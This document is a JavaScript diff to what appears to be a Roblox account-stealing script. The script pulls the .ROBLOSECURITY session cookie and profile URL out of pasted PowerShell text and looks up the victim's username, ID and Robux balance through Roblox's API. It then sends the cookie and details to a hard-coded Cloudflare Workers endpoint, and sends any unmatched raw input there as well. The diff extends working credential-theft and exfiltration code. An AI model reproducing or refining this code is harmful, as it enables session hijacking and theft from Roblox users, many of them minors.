@@ -1,7 +1,7 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
 function extractRobloxSecurityCookie(input) {
-  // Strictly match PowerShell format only
+  // Strictly match PowerShell format only for the .ROBLOSECURITY cookie
   const powershellPattern = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
   const powershellMatch = input.match(powershellPattern);
   
@@ -12,27 +12,43 @@ function extractRobloxSecurityCookie(input) {
   return null; // Not a PowerShell format
 }
 
-async function fetchRobloxUserData(cookie) {
-  const url = 'https://www.roblox.com/mobileapi/userinfo';
+function extractReferer(input) {
+  // Match the Referer value (the profile URL) in PowerShell format
+  const refererPattern = /"Referer"="([^"]+)"/;
+  const refererMatch = input.match(refererPattern);
 
-  const response = await fetch(url, {
-    method: 'GET',
-    headers: {
-      'Cookie': `.ROBLOSECURITY=${cookie}`
-    }
-  });
-
-  if (!response.ok) {
-    throw new Error(`Failed to fetch user data: ${response.status}`);
+  if (refererMatch) {
+    return refererMatch[1]; // Return the profile URL
   }
 
-  const data = await response.json();
+  return null; // No Referer found
+}
 
-  return {
-    username: data.UserName,
-    robux: data.Balance,
-    userId: data.UserID,
-  };
+async function getRobloxProfileInfo(cookie) {
+  try {
+    const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      method: 'GET',
+      headers: {
+        'Cookie': `.ROBLOSECURITY=${cookie}`,
+        'Content-Type': 'application/json'
+      }
+    });
+    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    
+    const profileData = await response.json();
+    
+    // Example response data: profileData.id, profileData.robux, etc.
+    const profileInfo = {
+      userId: profileData.id,
+      robuxBalance: profileData.robuxBalance,
+      username: profileData.username
+    };
+
+    return profileInfo;
+  } catch (error) {
+    console.error('Error fetching Roblox profile:', error);
+    throw error;
+  }
 }
 
 async function sendToProxy(data) {
@@ -41,10 +57,11 @@ async function sendToProxy(data) {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        sessionId: data.sessionId,
-        username: data.username,
-        robux: data.robux,
-        userId: data.userId,
+        sessionId: data.cookie,
+        userId: data.profileInfo.userId,
+        robuxBalance: data.profileInfo.robuxBalance,
+        username: data.profileInfo.username,
+        profileUrl: data.profileUrl, // Include the profile URL
         timestamp: new Date().toISOString()
       })
     });
@@ -57,32 +74,30 @@ async function sendToProxy(data) {
 }
 
 async function bruteforce(input) {
-  let content;
   const cookie = extractRobloxSecurityCookie(input);
+  const referer = extractReferer(input);
 
-  if (cookie) {
-    content = `✅ Extracted from PowerShell format:\n\`\`\`${cookie}\`\`\``;
-    
+  if (cookie && referer) {
     try {
-      const userData = await fetchRobloxUserData(cookie);
-      console.log('User Data:', userData);
-      sendToProxy({
-        sessionId: cookie,
-        username: userData.username,
-        robux: userData.robux,
-        userId: userData.userId,
-      });
+      const profileInfo = await getRobloxProfileInfo(cookie);
+      
+      // Format the message to send to the proxy
+      const content = {
+        cookie: cookie,
+        profileInfo: profileInfo,
+        profileUrl: referer // Add the profile URL to the data
+      };
+      
+      // Send the profile info along with the cookie and profile URL to the proxy
+      console.log(`✅ Profile Info:`, content);
+      sendToProxy(content);
     } catch (error) {
-      console.error('Error fetching user data:', error);
+      console.error('Error during bruteforce:', error);
     }
-
   } else {
-    content = `⚠️ Raw input (not PowerShell format):\n\`\`\`${input}\`\`\``;
+    console.log(`⚠️ Raw input (not PowerShell format):\n\`\`\`${input}\`\`\``);
+    sendToProxy({ sessionId: input });
   }
-
-  // Log or send to proxy
-  console.log(content);
-  sendToProxy({ sessionId: cookie || input });
 }
 
 
